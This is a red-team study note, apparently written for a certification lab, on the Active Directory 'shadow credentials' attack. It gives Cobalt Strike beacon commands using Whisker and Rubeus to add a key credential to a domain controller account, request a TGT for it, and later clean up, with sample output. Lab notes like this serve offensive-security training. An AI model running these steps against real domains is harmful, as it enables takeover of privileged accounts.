
The basis of the "shadow credentials" attack is that if you can write to the attribute "msDS-KeyCredentialLink" (see [[Key Trust Model]]) on a user or computer object, you can obtain a TGT for that principal.  As such, this is a DACL-style abuse as with [[Resource Based Constrained Delegation RBCD]].

Further info: [blog post](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) 
Tool to exploit: [Whisker](https://github.com/eladshamir/Whisker)  


## 🖊️ via Cobalt Strike

1) First, we want to list any keys that might already be present for a target - this is important for when we want to clean up later.

`beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:dc-2$`

2) Add a new key pair to the target.

`beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe add /target:dc-2$`

3) And now, we can ask for a TGT using the Rubeus command that Whisker provides.

`beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:dc-2$ /certificate:MIIJuA[...snip...]ICB9A= /password:"y52EhYqlfgnYPuRb" /nowrap`



 ⚠ Whisker's `clear` command will remove any and all keys from msDS-KeyCredentialLink.  This is a bad idea if a key was already present, because it will break legitimate passwordless authentication that was in place.  If this was the case, you can list the entries again and only remove the one you want.
 
```
beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:dc-2$
[*] Searching for the target account
[*] Target user found: CN=DC-2,OU=Domain Controllers,DC=dev,DC=cyberbotic,DC=io
[*] Listing deviced for dc-2$:
    DeviceID: 58d0ccec-1f8c-4c7a-8f7e-eb77bc9be403 | Creation Time: 1/21/2023 7:19:04 PM

beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe remove /target:dc-2$ /deviceid:58d0ccec-1f8c-4c7a-8f7e-eb77bc9be403
```




### Properties
---
📆 created   {{19-02-2024}} 14:13
🏷️ tags: #redteam #crto 

---

